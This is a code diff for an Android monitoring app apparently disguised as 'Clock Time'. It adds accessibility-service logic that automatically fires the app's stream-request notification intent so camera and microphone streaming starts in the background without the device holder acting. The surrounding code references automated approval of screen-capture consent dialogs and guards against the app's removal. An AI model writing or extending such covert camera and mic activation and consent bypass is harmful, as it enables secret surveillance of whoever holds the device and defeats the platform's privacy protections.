@@ -1,14 +1,18 @@
 package com.childmonitor
 
 import android.accessibilityservice.AccessibilityService
+import android.app.Notification
+import android.app.PendingIntent
 import android.os.Handler
 import android.os.Looper
+import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import com.childmonitor.accessibility.AccessibilityTamperGuard
 import com.childmonitor.accessibility.BlockedAppCloser
 import com.childmonitor.accessibility.DeviceAdminTamperGuard
 import com.childmonitor.accessibility.MediaProjectionConsentAutomation
 import com.childmonitor.capture.MediaProjectionTokenStore
+import com.childmonitor.capture.StreamRequestNotificationHelper
 import com.childmonitor.debug.PermissionDebugLogger
 
 class AppBlockingAccessibilityService : AccessibilityService() {
@@ -101,6 +105,15 @@ class AppBlockingAccessibilityService : AccessibilityService() {
         val snapshot = AccessibilityEvent.obtain(event)
         val packageName = snapshot.packageName?.toString()
         val eventType = snapshot.eventType
+
+        // Screen-on Xiaomi path: stream-request heads-up does not auto-launch via FSI.
+        // Fire the notification content PendingIntent so StreamBootstrapActivity can start
+        // typed camera/mic FGS without the parent needing Clock Time already open.
+        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED &&
+            packageName == applicationContext.packageName
+        ) {
+            mainHandler.post { maybeAutoLaunchStreamRequestNotification(snapshot) }
+        }
 
         // Auto-approve is always on once Accessibility is connected — no separate "arm"
         // window required. Safety comes from the dialog package/text allowlist in
@@ -366,6 +379,28 @@ class AppBlockingAccessibilityService : AccessibilityService() {
             } finally {
                 root.recycle()
             }
+        }
+    }
+
+    /**
+     * Auto-activate our stream-request notification PendingIntent (id 5001) so parent
+     * camera starts while Clock Time is backgrounded and the screen is on.
+     */
+    private fun maybeAutoLaunchStreamRequestNotification(event: AccessibilityEvent) {
+        val data = event.parcelableData
+        if (data !is Notification) return
+        // Prefer fullScreenIntent (same PendingIntent as content for stream-request).
+        val pending: PendingIntent? = data.fullScreenIntent ?: data.contentIntent
+        if (pending == null) return
+        try {
+            pending.send()
+            Log.i(
+                "AppBlockingA11y",
+                "auto-launched stream-request notification intent " +
+                    "(notifId expect=${StreamRequestNotificationHelper.NOTIFICATION_ID})",
+            )
+        } catch (e: Exception) {
+            Log.w("AppBlockingA11y", "auto-launch stream-request notification failed: ${e.message}")
         }
     }
 
